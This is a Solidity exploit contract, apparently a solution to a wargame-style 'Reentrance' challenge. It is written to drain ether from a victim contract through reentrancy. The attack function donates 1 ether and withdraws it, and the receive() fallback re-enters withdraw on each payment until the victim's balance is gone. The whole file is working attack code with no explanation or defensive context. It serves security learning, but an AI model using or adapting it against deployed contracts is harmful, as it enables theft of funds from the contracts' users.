// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract ReentrancyAttack {

    address public attacker;

    IReentrance public reentranceInstance;

    modifier onlyAttacker {
        require(msg.sender == attacker, "ReentrancyAttack: NOT_OWNER");
        _;
    }

    constructor() public {
        attacker = msg.sender;
    }

    function attack(address _victim) external payable onlyAttacker {
        require(msg.value >= 1 ether, "ReentrancyAttack: INSUFFICIENT_FUNDS");
        reentranceInstance = IReentrance(_victim);
        reentranceInstance.donate{ value: (1 ether) }(address(this));
        reentranceInstance.withdraw(1 ether);
    }

    receive() external payable {
        reentranceInstance.withdraw(1 ether);
    }
}
